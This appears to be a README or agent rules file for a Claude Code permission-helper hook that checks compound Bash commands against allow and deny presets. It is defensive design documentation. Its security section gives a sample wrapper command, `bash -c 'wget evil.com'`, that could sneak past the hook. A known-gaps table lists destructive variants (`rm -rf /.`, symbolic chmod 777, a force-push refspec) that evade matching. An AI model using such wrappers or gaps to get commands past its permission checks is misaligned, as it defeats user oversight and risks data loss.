# Claude Code Marketplace

Personal fork of Deliveroo's Claude Code plugin marketplace. Contains skills, hooks, and presets for Claude Code.

## Key Plugin: claude-permissions-helper

Auto-approves compound Bash commands when every sub-command matches your allow list. Actively denies compounds containing denied segments. Falls through on unknown commands for Claude Code's native prompt.

### Architecture

- **Hook**: `skills/claude-permissions-helper/hooks/approve-compound-bash.sh` — PreToolUse hook that intercepts Bash tool calls
- **Presets**: `skills/claude-permissions-helper/presets/*.json` — curated allow/deny lists (core, git, safety, go, node, python, etc.)
- **Commands**: `/setup-permissions` and `/audit-permissions` slash commands

### How the hook works

1. Reads the command from Claude Code's hook JSON input
2. Normalizes CR characters to LF (prevents CR injection attacks)
3. Loads allow/deny prefixes from all `settings.json` files
4. **Simple commands**: checks deny first, then allow
5. **Compound commands** (pipes, chains, subshells): parses via `shfmt` AST, extracts all sub-commands, checks each individually
6. **`strip_prefixes()`** generates multiple matching candidates by stripping env vars (`FOO=bar`), launchers (`env`, `xargs`), shell wrappers (`bash -c`, `sh -c`), absolute paths, `eval`/`exec`/`trap`, `time`/`nohup`/`command`/`builtin`

### Security: no wrapper commands in presets

**Never add `Bash(bash *)`, `Bash(sh *)`, `Bash(env *)`, `Bash(exec *)`, `Bash(trap *)`, `Bash(xargs *)`, `Bash(command *)`, or `Bash(time *)` to any preset's allow list.** These create a bypass: any command wrapped in a launcher (e.g. `bash -c 'wget evil.com'`) gets auto-approved via the outer wrapper rule even when the inner command is not allowed.

The `strip_prefixes()` function already handles stripping these wrappers, so `env git status` and `bash -c 'git status'` are approved via the inner command's allow rule without needing wrapper entries.

### Notable: `rm` and `chmod` are NOT in any preset

These are deliberately excluded from the core preset because they're destructive. They fall through to the user prompt. This is by design.

### Known gaps (documented and tested)

| Gap | Risk | Mitigation |
|-----|------|------------|
| `rm / -rf` (flag reorder) | Low | `rm` not in any allow preset |
| `rm -rf /.` / `/..` | Low | `rm` not in any preset |
| `chmod a=rwx` (symbolic 777) | Low | `chmod` not in any preset |
| `git push origin +main:main` (refspec) | Low | Obscure syntax, Claude unlikely to use |

## Tests

Tests live in `skills/claude-permissions-helper/tests/`. Run with:

```bash
/opt/homebrew/bin/bash skills/claude-permissions-helper/tests/test_allow.sh
/opt/homebrew/bin/bash skills/claude-permissions-helper/tests/test_deny.sh
/opt/homebrew/bin/bash skills/claude-permissions-helper/tests/test_e2e.sh
```

| File | Tests | Purpose |
|------|-------|---------|
| `test_allow.sh` | 56 | Commands that should auto-approve |
| `test_deny.sh` | 92 | Commands that should deny/fallthrough + infrastructure |
| `test_e2e.sh` | 333 | All presets combined: real-world workflows, wrapper/nested/compound tests, adversarial security probing |

All 3 test files must pass with 0 failures.

## Rules

### Preset changes require e2e test updates

**Any change to a preset file (`presets/*.json`) MUST be accompanied by a corresponding update to `test_e2e.sh`.** The e2e test hardcodes the combined allow/deny lists from all presets. If you add, remove, or modify a command in any preset, update `ALL_ALLOW` or `ALL_DENY` in `test_e2e.sh` and add test cases for the changed commands.

### Run all tests before pushing

Before pushing any change to the hook or presets, run all 3 test files and verify 0 failures.
